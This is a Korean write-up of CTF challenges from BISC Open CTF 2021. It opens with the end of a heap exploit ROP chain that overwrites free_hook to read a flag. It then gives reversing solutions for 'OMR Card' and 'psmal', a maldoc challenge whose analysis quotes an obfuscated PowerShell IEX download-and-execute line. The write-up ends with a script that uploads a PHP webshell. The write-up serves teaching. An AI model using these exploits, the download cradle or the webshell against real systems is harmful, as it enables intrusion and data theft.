# stage3: write rop payload in bss
bss = 0x404100

create(0, 0x200, b'aaaa')
create(1, 0x200, b'aaaa')
delete(1)
delete(0)
edit(0, p64(bss))
create(0, 0x200, b'aaaa')

payload = b''
payload += p64(0)
payload += p64(bss)
payload += p64(0)
payload += p64(0)
payload += p64(setcontext)

payload += p64(0)                 # <-- [rdx + 0x28] = r8
payload += p64(0)                 # <-- [rdx + 0x30] = r9
payload += b'a' * 0x10            # padding
payload += p64(0)                 # <-- [rdx + 0x48] = r12
payload += p64(0)                 # <-- [rdx + 0x50] = r13
payload += p64(0)                 # <-- [rdx + 0x58] = r14
payload += p64(0)                 # <-- [rdx + 0x60] = r15
payload += p64(bss + 0x158)       # <-- [rdx + 0x68] = rdi
payload += p64(0)                 # <-- [rdx + 0x70] = rsi
payload += p64(0)                 # <-- [rdx + 0x78] = rbp
payload += p64(0)                 # <-- [rdx + 0x80] = rbx
payload += p64(0)                 # <-- [rdx + 0x88] = rdx 
payload += b'a' * 8               # padding
payload += p64(0)                 # <-- [rdx + 0x98] = rcx 
payload += p64(bss + 0xb0)        # <-- [rdx + 0xa0] = rsp
payload += p64(pop_rax)           # <-- [rdx + 0xa8] = rcx

payload += p64(2)
payload += p64(syscall)           # open('flag', O_RDONLY)
payload += p64(xchg_eax_edi)
payload += p64(pop_rsi)
payload += p64(bss + 0x300)
payload += p64(pop_rdx_r12)
payload += p64(0x100)
payload += p64(0x0)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall)           # read(fd, bss+0x300), 0x100)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(bss + 0x300)
payload += p64(pop_rdx_r12)
payload += p64(0x100)
payload += p64(0x0)
payload += p64(pop_rax)
payload += p64(1)
payload += p64(syscall)           # write(1, bss+0x300, 0x100)
payload += b'/home/secure-note/flag.txt'

create(3, 0x200, payload)

# stage4: overwrite free_hook to trigger payload
create(0, 0x100, b'aaaa')
create(1, 0x100, b'aaaa')
delete(1)
delete(0)
edit(0, p64(free_hook))
create(0, 0x100, b'aaaa')
create(0, 0x100, p64(call_rdx))
delete(3)

p.interactive()
```

# [REVERSING] OMR Card, psmal

라온화이트햇 핵심연구팀 이충일

# 0. 개요

---

2021. 11. 27(토) 14시~18시까지 진행한 BISC Open CTF에 리버싱 분야로 `OMR Card`, `psmal`  문제를 출제했습니다.

본 문서는 각 문제에 대한 풀이를 작성한 보고서입니다.

# 1. OMR Card

---

`Solver : 1명`

## 1.1 문제 설명

---

> **You can get a flag by marking the card.**
> 

해당 문제는 C++을 이용하여 간단한 게임을 제작하였습니다.

![Untitled](/assets/2022-01-01/BISC%2022.png)

게임 실행 시 `Mark` 할 수 있는 표가 등장합니다.

![Untitled](/assets/2022-01-01/BISC%2023.png)

무작위로 4개의 `Mark`를 표시한 후  엔터 키를 입력하여 `Submit`을 합니다.

오른쪽에 출력되는 Marks의 경우 `400 + 체크한 Mark의 수` 인 것을 알 수 있습니다. 

![Untitled](/assets/2022-01-01/BISC%2024.png)

`Submit` 한 후  `YOU LOSE!` 가 출력되며 프로그램이 종료됩니다. 

따라서 특정 인덱스를 `Mark`로 표시한 후 `Submit` 하면 `FLAG`를 얻을 수 있다고 예상할 수 있습니다. 

## 1.2 문제 풀이

---

### 1.2.1 Main 함수

![Untitled](/assets/2022-01-01/BISC%2025.png)

`Main 함수`를 분석 해보면, 아래와 같은 기능을 확인할 수 있습니다.

- Line 14 ~ 20

 `dispBanner(배너 출력)`, `drawFiled(표 출력)`, `dispFlagCounter(Marks 출력)`, `dispControls(조작키 출력)` 등 화면에 대한 출력 부분을 확인할 수 있습니다.

- Line 21 ~ 33

 `dispDefeat(YOU LOSE! 출력)`, `dispVictory(YOU WIN! 출력), While Loop break(프로그램 종료)` 등 `gameState`에 따라 실행되는 로직을 확인할 수 있습니다. 

- Line 34

`getMove(키 입력에 대한 처리)` 

![Untitled](/assets/2022-01-01/BISC%2026.png)

결국 `gameState`가 FLAG를 얻을 수 있는 `Validation` 임을 알 수 있고, 

`gameState`의 참조를 따라가보면, Field 클래스의 `submit` 함수에서 `gameState`을 변경해주는 것을 확인할 수 있습니다.

![Untitled](/assets/2022-01-01/BISC%2027.png)

또한, `getMove` 함수를 분석하면 Line 18 ~ 19에서 Enter 입력 시 `submit` 함수를 호출하는 것을 확인할 수 있습니다. 

### 1.2.2 Submit 함수

---

![Untitled](/assets/2022-01-01/BISC%2028.png)

`dispVictory(YOU WIN! 출력)` 함수를 호출하기 위해서는 `gameState`가 `0`이 되어야합니다. 

`gameState`가 `0`이 되기 위해서는 아래의 2가지 조건을 만족해야 합니다.

1. SevSegDisp::get(&flagDisp) == 456
2. Line 91 ~ 105의 For 문을 실행할 동안 Line 103에서  *std::vector<Cell>::operator[](v8, v7)가 1이여야 함. 

### 1.2.3 첫번째 조건

---

> **SevSegDisp::get(&flagDisp) == 456**
> 

![Untitled](/assets/2022-01-01/BISC%2029.png)

Line 89의 SevSegDisp::get() 함수 호출 부분에 bp를 걸어 디버깅을 합니다.

![Untitled](/assets/2022-01-01/BISC%2030.png)

`Mark`를 10개 체크한 후 `Sumbit` !

![Untitled](/assets/2022-01-01/BISC%2031.png)

`SevSegDisp::get()` 함수의 리턴 값을 확인해보면 `0x19A(410)`인 것을 확인할 수 있습니다.

따라서 `SevSegDisp::get(&flagDisp)` 함수는 현재의 Marks 값을 의미하는 것을 알 수 있습니다.

첫번째 조건 SevSegDisp::get(&flagDisp) == 456을 만족하기 위해서는 **Mark를 56번 체크** 해주면 됩니다.

![Untitled](/assets/2022-01-01/BISC%2032.png)

하지만, 다음과 같이 `Mark`를 56번 체크해주어도 `YOU LOSE!`가 출력됩니다.

따라서 두번째 조건까지 만족해주어야 합니다.

### 1.2.4 두번째 조건

---

> **Line 91 ~ 105의 For 문을 실행할 동안 Line 103에서  *std::vector<Cell>::operator[](v8, v7)가 1이여야 함.**
> 

![Untitled](/assets/2022-01-01/BISC%2033.png)

해당 부분을 디버깅 및 어셈블리로 분석해보면, for 문을 56번 돌면서, 특정 WORD 값을 가져와 연산 후 v7, v8을 구합니다. 

![Untitled](/assets/2022-01-01/BISC%2034.png)

WORD 값은 `[rbp+var_40]`에서  2byte씩 가져와 연산합니다. 

![Untitled](/assets/2022-01-01/BISC%2035.png)

```python
EncData_addr = 0x7FFFA5053330
EncData = get_bytes(EncData_addr, 56 * 2)
print(EncData)

# b'\x00\x02\x00\x02\x80\x01\x00\x01\x80\x010\x01\xa0\x00T\x00,\x00\x17\x00\x0c\x00  \x10\xb0\x08\xb8\x04l\x02N\x011\x01\x01\x00\x83\xc0B\xe0!@\x11\xc8\x08\x06\x06\r\x03\x8a\x81\xc8@e 30  \x108\x08(\x04$\x02\x15\x01\r\xe0\xa0\x90PX(4\x14&\n\x15\x05\x8b\x82FA\xa4\xe0Q\xd0(\xf8\x14\x84\nF\x05%\x82\x93\xc1J\xa0\xa5\xf0R\x88)\xcc\x14j\n'
```

for 문을 56번 반복하며 2byte 씩 가져와서 연산하므로 EncData를 `IDAPython`을 통해 가져올 수 있습니다.

```python
import struct

def ROL(data, shift, size=16):
    shift %= size
    remains = data >> (size - shift)
    body = (data << shift) - (remains << size )
    return (body + remains)
     
def ROR(data, shift, size=16):
    shift %= size
    body = data >> shift
    remains = (data << (size - shift)) - (body << size)
    return (body + remains)

EncData = b'\x00\x02\x00\x02\x80\x01\x00\x01\x80\x010\x01\xa0\x00T\x00,\x00\x17\x00\x0c\x00  \x10\xb0\x08\xb8\x04l\x02N\x011\x01\x01\x00\x83\xc0B\xe0!@\x11\xc8\x08\x06\x06\r\x03\x8a\x81\xc8@e 30  \x108\x08(\x04$\x02\x15\x01\r\xe0\xa0\x90PX(4\x14&\n\x15\x05\x8b\x82FA\xa4\xe0Q\xd0(\xf8\x14\x84\nF\x05%\x82\x93\xc1J\xa0\xa5\xf0R\x88)\xcc\x14j\n'

for i in range(56):
    DecData = struct.unpack('<H', EncData[i*2:i*2+2])[0]
    
    HIBYTE = (DecData & 0xFF00) >> 8
    LOBYTE = DecData & 0xFF
    DecData = ((LOBYTE << 8) + HIBYTE) 
    
    DecData = ROL(DecData, i)
    
    HIBYTE = (DecData & 0xFF00) >> 8
    DecData += int((DecData -255 * HIBYTE) / -2)
    
    v7 = DecData & 0xFF
    v8 = (DecData & 0xFF00) >> 8
    print(v8, v7)
```

Line 91 ~ 102 부분을 Python으로 포팅하면 위와 같은 코드를 만들 수 있고, v8과 v7 값을 출력해보면 아래와 같은 값을 얻을 수 있습니다.

- print result
    
    ```java
    # print
    0 1
    0 2
    0 3
    0 4
    0 12
    0 19
    0 20
    0 21
    0 22
    0 23
    0 24
    1 0
    1 5
    1 11
    1 13
    1 19
    1 24
    2 0
    2 5
    2 10
    2 14
    2 19
    2 24
    3 0
    3 5
    3 9
    3 15
    3 19
    3 24
    4 0
    4 5
    4 8
    4 16
    4 19
    4 24
    5 1
    5 2
    5 3
    5 4
    5 7
    5 8
    5 9
    5 10
    5 17
    5 12
    5 13
    5 14
    5 15
    5 16
    5 17
    5 19
    5 20
    5 21
    5 22
    5 23
    5 24
    ```
    

따라서 `v8`은  `row`, `v7`은 `column`의 인덱스로 예상할 수 있고,  해당 인덱스 값으로 그림을 그려보면 Mark 그림을 얻을 수 있습니다. 

### 1.2.5 플래그 획득

---

```python
import struct

def ROL(data, shift, size=16):
    shift %= size
    remains = data >> (size - shift)
    body = (data << shift) - (remains << size )
    return (body + remains)
     
def ROR(data, shift, size=16):
    shift %= size
    body = data >> shift
    remains = (data << (size - shift)) - (body << size)
    return (body + remains)

EncData = b'\x00\x02\x00\x02\x80\x01\x00\x01\x80\x010\x01\xa0\x00T\x00,\x00\x17\x00\x0c\x00  \x10\xb0\x08\xb8\x04l\x02N\x011\x01\x01\x00\x83\xc0B\xe0!@\x11\xc8\x08\x06\x06\r\x03\x8a\x81\xc8@e 30  \x108\x08(\x04$\x02\x15\x01\r\xe0\xa0\x90PX(4\x14&\n\x15\x05\x8b\x82FA\xa4\xe0Q\xd0(\xf8\x14\x84\nF\x05%\x82\x93\xc1J\xa0\xa5\xf0R\x88)\xcc\x14j\n'

row = 6
column = 25
cells = [([0] * column) for i in range(row)] 

for i in range(56):
    DecData = struct.unpack('<H', EncData[i*2:i*2+2])[0]
    
    HIBYTE = (DecData & 0xFF00) >> 8
    LOBYTE = DecData & 0xFF
    DecData = ((LOBYTE << 8) + HIBYTE) 
    
    DecData = ROL(DecData, i)
    
    HIBYTE = (DecData & 0xFF00) >> 8
    DecData += int((DecData -255 * HIBYTE) / -2)
    
    v7 = DecData & 0xFF
    v8 = (DecData & 0xFF00) >> 8
    cells[v8][v7] = 1

for i in range(row):
    for j in range(column):
        if cells[i][j] == 1:        
            print("o", end=" ")
        else:
            print(".", end=" ")
    print()
```

![Untitled](/assets/2022-01-01/BISC%2036.png)

위와 같은 연산 없이  `IDAPython`의 `hook` 기능을 이용하면 쉽게 인덱스를 추출할 수 있습니다. 

```python
from idc import *
from ida_dbg import *

class hook(DBG_Hooks):
    def dbg_process_start(self, pid, tid, ea, name, base, size):
        base = idaapi.get_imagebase()
        add_bpt(base + 0x6A6A)
        add_bpt(base + 0x6BB5)
        return 0
 
    def dbg_process_exit(self, pid, tid, ea, code):
        self.unhook()
        print("end")
        return 0
 
    def dbg_library_load(self, pid, tid, ea, name, base, size):
        return 0
 
    def dbg_bpt(self, tid, ea):

        base = idaapi.get_imagebase()
        
        if ea == base + 0x6A6A:
            set_reg_value(456, "RAX")
        elif ea == base + 0x6BB5:
            row = get_reg_value("RDX")
            column = get_reg_value("RSI")
            print(f"({row}, {column})", end="")

        continue_process()
        return 0

print("start")
debugger = hook()
debugger.hook()

start_process()
```

 

![Untitled](/assets/2022-01-01/BISC%2037.png)

# 2. psmal

---

`Solver : 2명`

## 2.1 문제 설명

---

> **Find the flag on the Server**
> 

Powershell을 이용하여 간단한 문서형 악성코드를 제작하였습니다. 

![Untitled](/assets/2022-01-01/BISC%2038.png)

문제로 제공되는 `execute_me.doc` 워드 파일은 VBA 매크로가 포함되어, 실행하는 순간 특정 행위를 시작합니다.

**윈도우 디펜더를 끄지 않으면 해당 doc 문서에 포함된 VBA 매크로로 인해 악성 파일로 탐지됩니다.**

## 2.2 문제 풀이

---

### 2.2.1 execute_me.doc 분석

---

![Untitled](/assets/2022-01-01/BISC%2039.png)

![Untitled](/assets/2022-01-01/BISC%2040.png)

상단의 보기 → 매크로 → 매크로 보기 → 매크로 선택 → 편집을 누르면 해당 `execute_me.doc`에 포함된 VBA 매크로를 확인할 수 있습니다. 

![Untitled](/assets/2022-01-01/BISC%2041.png)

`Execute` 함수 맨 마지막 줄을 보면 Create Process를 하여 `powershell.exe`를 실행시키는 것을 확인할 수 있습니다. 

`powershell.exe`에 `-c` 옵션을 주면 실행시킬 명령을 인자로 줄 수 있습니다. 

### 2.2.2 powershell 스크립트 역난독화

---

인자로 들어가는 powershell 명령어가 난독화되어 있기 때문에 역난독화를 진행해주어야합니다.

```powershell
&( $PShOmE[4]+$PSHOMe[34]+'X')( neW-OBJeCT  iO.comPrEsSion.deFlatESTrEaM( [sYstEM.IO.MeMORYsTrEAm][SyStEM.coNVErt]::FRombase64stRIng('DcS9DoIwEADgV2GjHbx6F/oHozq44OCg61UKQkgx5hJeX7/hu16elVJ93g+3tOSXVH0WeOR0WudcRMN528u68XCX71wmVb9FPq0xRASIHvAYgdC2obHBYBzJWmR2TINzI7vGcfD+fwqJYq119wM=' ), [io.compreSSIOn.comprEsSiOnMoDE]::DecOmPreSS ) | % {neW-OBJeCT  systeM.iO.StREaMreAdeR( $_, [SYsteM.tEXt.enCodIng]::aScII )}| % {$_.reaDToenD( )} )
```

powershell에서 `Invoke-Expression`이라는 `cmdlet`은  주어진 문자열을 명령으로 실행하고 결과를 반환합니다. `Javascript`에서 `eval` 함수와 비슷한 역할을 수행하는 명령입니다. 

`Invoke-Expression`은 `iex` 로 축약해서 사용할 수 있습니다. 

위의 난독화된 powershell 스크립트를 쉽게 역난독화하는 방법 중 하나는 `iex` 를  `echo`로 치환하는 방법으로, 아래와 같이 `&( $PShOmE[4]+$PSHOMe[34]+'X')`을 `echo`로 치환하여 powershell 스크립트를 실행함으로써 역난독화된 코드를 추출할 수 있습니다.

```powershell
echo ( neW-OBJeCT  iO.comPrEsSion.deFlatESTrEaM( [sYstEM.IO.MeMORYsTrEAm][SyStEM.coNVErt]::FRombase64stRIng('DcS9DoIwEADgV2GjHbx6F/oHozq44OCg61UKQkgx5hJeX7/hu16elVJ93g+3tOSXVH0WeOR0WudcRMN528u68XCX71wmVb9FPq0xRASIHvAYgdC2obHBYBzJWmR2TINzI7vGcfD+fwqJYq119wM=' ), [io.compreSSIOn.comprEsSiOnMoDE]::DecOmPreSS ) | % {neW-OBJeCT  systeM.iO.StREaMreAdeR( $_, [SYsteM.tEXt.enCodIng]::aScII )}| % {$_.reaDToenD( )} )
```

![Untitled](/assets/2022-01-01/BISC%2042.png)

```powershell
# 출력 값
IEX ((New-Object Net.WebClient).DownloadString('[http://222.117.109.215:8458/19f2551aa6a2d66fa646a87746ab8b29](http://222.117.109.215:8458/19f2551aa6a2d66fa646a87746ab8b29)'));
```

닷넷의 WebClient 클래스를 이용하여 `http://222.117.109.215:8458` 주소에서 `19f2551aa6a2d66fa646a87746ab8b29` 파일을 다운로드하여 다시 `IEX`로 실행하는 것을 확인할 수 있습니다. 

해당 URL 경로를 요청해보면 엄청나게 많은 데이터가 `Deflaterstream`로 `Compression`되어 있습니다. 

![Untitled](/assets/2022-01-01/BISC%2043.png)

![Untitled](/assets/2022-01-01/BISC%2044.png)

맨 아래 줄에서 파이프라인으로 `iNvOKe-ExPrESsIOn` 에 `Decompress`한 데이터를 전달하는 것을 볼 수 있습니다.

![Untitled](/assets/2022-01-01/BISC%2045.png)

따라서 `http://222.117.109.215:8458/19f2551aa6a2d66fa646a87746ab8b29` 데이터를 파일로 저장하고, 맨 끝에 존재하는 `iNvOKe-ExPrESsIOn`을 `echo`로 치환해준 뒤 실행하면 역난독화된 스크립트를 얻을 수 있습니다. 

 데이터가 너무 크기 때문에 리다이렉션을 이용하여 바탕화면에 `result.ps1`이라는 파일로 생성해주었습니다.

![Untitled](/assets/2022-01-01/BISC%2046.png)

`result.ps1` 파일을 분석해보면, `$gogogo` 변수에 저장된 base64 인코딩 데이터를 디코딩하여 `$env:USERPROFILE+"\Contacts\"` 경로에 `go.exe`라는 바이너리를 생성한 후 실행합니다. 
이때 인자값으로 `$env:USERNAME`과 `$env:USERPROFILE`을 전달합니다.

`$env:USERPROFILE`은 사용자 폴더의 위치인 `C:\Users\[사용자 명]`이고, `"\Contacts\"`는 사용자 경로에 기본으로 존재하는 연락처 폴더입니다.

 

### 2.2.3 Go 바이너리 분석

---

![Untitled](/assets/2022-01-01/BISC%2047.png)

`C:\Users\[사용자 명]\Contacts\` 경로에 가보면 `go.exe` 실행파일을 확인할 수 있습니다. 

실행 인자값으로는 `$env:USERNAME`와 `$env:USERPROFILE`을 전달하였는데 각각 `bugday`, `C:\Users\bugda`임을 확인할 수 있습니다. 

![Untitled](/assets/2022-01-01/BISC%2048.png)

Detect It Easy로 바이너리를 확인해보면, `Golang`으로 컴파일된 `Go 바이너리`인 것을 확인할 수 있습니다. 

`result.ps1` 에서 go.exe 실행 시 인자값으로 `$env:USERNAME`와 `$env:USERPROFILE` 전달하기 때문에 

`go.exe bugday C:\Users\bugda`로 실행 후 디버깅을 통해 분석합니다.

프로그램 실행 시 인자를 잘 넣어주면 `main_health_check` 함수를 호출합니다.

### 2.2.4 main_health_check 함수 분석

---

![Untitled](/assets/2022-01-01/BISC%2049.png)

![Untitled](/assets/2022-01-01/BISC%2050.png)

`base_addr+0x1EE4D3` 주소에서 `runtime_concatstring2` 함수를 호출하며

[http://222.117.109.215:8458/check.php?user](http://222.117.109.215:8458/check.php?user)=과 `사용자 명(bugday)` 문자열을 `concat` 합니다.

![Untitled](/assets/2022-01-01/BISC%2051.png)

그 후 `base_addr+0x1EE52D` 주소에서 위에서 생성한 URL로 GET 요청을 보내는 것을 알 수 있습니다. 

![Untitled](/assets/2022-01-01/BISC%2052.png)

해당 URL로 요청한 결과 무의미한 응답을 확인할 수 있습니다.

![Untitled](/assets/2022-01-01/BISC%2053.png)

`main_health_check` 함수가 끝난 후 `base_addr+0x1EE20F` 주소에서 `3600000000000`  만큼 `time_Sleep` 하는 것을 확인할 수 있습니다. 따라서 `rax` 값을 `0`으로 바꿔준 후 다음 분석을 진행할 수 있습니다.

![Untitled](/assets/2022-01-01/BISC%2054.png)

분석을 진행하다보면 바탕화면에서 파일을 탐색하여 `.txt`, `.doc`, `.xls` 확장자를 가진 파일인 경우 `main_fileupload` 함수를 호출하는 것을 확인할 수 있습니다. 

### 2.2.5 main_fileupload 함수 분석

---

![Untitled](/assets/2022-01-01/BISC%2055.png)

해당 함수를 분석하다보면 `base_addr+0x1EE9B8`에서 `net_http___ptr_Client__do` 함수를 호출하여 HTTP 요청을 보냅니다. 

![Untitled](/assets/2022-01-01/BISC%2056.png)

![Untitled](/assets/2022-01-01/BISC%2057.png)

이때 인자로 넘겨지는 구조체를 분석하면 위와 같이 파일 업로드의 요청 URL과 파일 업로드에 사용되는 form-data의 변수명을 확인할 수 있습니다.

따라서 문제에서 서버에서 플래그를 찾으라고 했으므로, 파일 업로드 취약점을 생각할 수 있습니다.

### 2.2.6 플래그 획득

---

```python
import requests

res = requests.post('http://222.117.109.215:8458/upload.php', files = {"file":("webshell.php","<?php system($_GET['cmd']) ?>")})
print(res.status_code)
```

위와 같은 python 코드로 PHP Webshell을 업로드 한 뒤 실행합니다.

![Untitled](/assets/2022-01-01/BISC%2058.png)

파일 업로드 경로는 `upload.php` 페이지에서 확인할 수 있고, 웹쉘을 실행시켜 `Document Root` 경로에서 플래그를 가진 파일명을 확인할 수 있습니다.

![Untitled](/assets/2022-01-01/BISC%2059.png)